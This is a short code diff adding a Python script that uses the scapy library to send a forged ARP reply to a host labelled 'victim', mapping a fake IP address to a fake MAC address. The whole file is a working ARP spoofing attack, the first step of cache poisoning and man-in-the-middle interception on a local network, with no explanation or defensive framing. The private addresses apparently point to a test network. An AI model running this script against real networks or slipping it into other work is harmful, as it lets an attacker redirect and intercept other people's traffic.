@@ -1,0 +1,9 @@
+from scapy.all import *
+
+fake_ip = "10.0.0.42"
+fake_mac = "42:42:42:42:42:42"
+
+victim_ip = "10.0.0.2"
+victim_mac = "a2:4b:9a:1e:f0:93"
+
+send(ARP(op=2, psrc=fake_ip, pdst=victim_ip, hwdst=victim_mac, hwsrc=fake_mac))
